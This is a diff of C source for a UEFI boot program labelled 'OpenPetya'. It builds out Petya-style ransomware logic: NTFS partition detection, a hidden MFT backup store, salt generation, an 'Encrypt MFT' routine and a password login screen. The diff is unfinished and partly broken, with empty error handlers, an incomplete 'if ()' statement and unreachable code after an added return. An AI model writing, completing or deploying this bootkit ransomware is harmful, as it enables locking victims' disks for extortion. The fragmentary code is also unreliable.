@@ -6,6 +6,7 @@
 #include "ntfs.h"
 #include "ntfs_crypt.h"
 #include "state.h"
+#include "hidden_store.h"
 
 #define MAX_ATTEMPTS 3
 #define MAX_PW_LEN 32
@@ -13,6 +14,17 @@
 void clear(EFI_SYSTEM_TABLE *systab)
 {
     systab->ConOut->ClearScreen(systab->ConOut);
+}
+
+void set_color(EFI_SYSTEM_TABLE *systab, UINT16 color)
+{
+    systab->ConOut->SetAttribute(systab->ConOut, color);
+}
+
+void zero_buffer(char *buffer, int len)
+{
+    for (int i = 0; i < len; i++)
+        buffer[i] = 0;
 }
 
 void readline(EFI_SYSTEM_TABLE *systab, CHAR16 *buffer, UINTN max)
@@ -85,24 +97,59 @@ void readline(EFI_SYSTEM_TABLE *systab, CHAR16 *buffer, UINTN max)
 
 /// @brief Encrypt MFT
 /// @param systab 
-void do_encryption(EFI_SYSTEM_TABLE *systab)
+EFI_STATUS do_encryption(EFI_SYSTEM_TABLE *systab)
 {
     clear(systab);
 
     uint64_t disk_size = state_read_disk_size();
     if (disk_size == 0)
     {
-
+        Print(L"ERROR: Disk size is not set by installer.\n");
+        return EFI_ABORTED;
     }
+
+    Print(L"Detecting NTFS partition...\n");
+    uint32_t partition_lba = ntfs_find_first_partitionLBA();
+    if (partition_lba == 0)
+    {
+        set_color(systab, EFI_RED | EFI_BACKGROUND_BLACK);
+        Print(L"ERROR: No NTFS partition found!\n");
+        return EFI_ABORTED;
+    }
+
+    hidden_store_init(disk_size);
+
+    if (hidden_backup_mft(partition_lba) != 0)
+    {
+
+        return EFI_ABORTED;
+    }
+
+    if (ntfs_generate_salt() != 0)
+    {
+
+        return EFI_ABORTED;
+    }
+
+    char password[65];
+    if ()
+
+    return EFI_SUCCESS;
 }
 
 /// @brief Login panel
 /// @param systab 
-void do_login(EFI_SYSTEM_TABLE *systab)
+EFI_STATUS do_login(EFI_SYSTEM_TABLE *systab)
 {
     clear(systab);
 
+    set_color(systab, EFI_BACKGROUND_BLUE | EFI_WHITE);
     
+    char input[MAX_PW_LEN];
+    int attempts = 3;
+
+
+    return EFI_SUCCESS;
 }
 
 /// @brief main function
@@ -113,7 +160,7 @@ EFI_STATUS efi_main(EFI_HANDLE image, EFI_SYSTEM_TABLE *systab)
 {
     InitializeLib(image, systab);
 
-    systab->ConOut->SetAttribute(systab->ConOut, EFI_WHITE | EFI_BACKGROUND_BLUE);
+    set_color(systab, EFI_WHITE | EFI_BACKGROUND_BLUE);
     clear(systab);
     
     Print(L"OpenPetya (UEFI)\n\n");
@@ -143,10 +190,12 @@ EFI_STATUS efi_main(EFI_HANDLE image, EFI_SYSTEM_TABLE *systab)
     else
         do_login(systab);
 
+    return state == 0x00 ? do_encryption(systab) : do_login(systab);
+
     // EFI_INPUT_KEY key;
     // Print(L"Press any key to continue...\n");
     // WaitForSingleEvent(systab->ConIn->WaitForKey, 0);
     // systab->ConIn->ReadKeyStroke(systab->ConIn, &key);
 
-    return EFI_SUCCESS;
+    // return EFI_SUCCESS;
 }
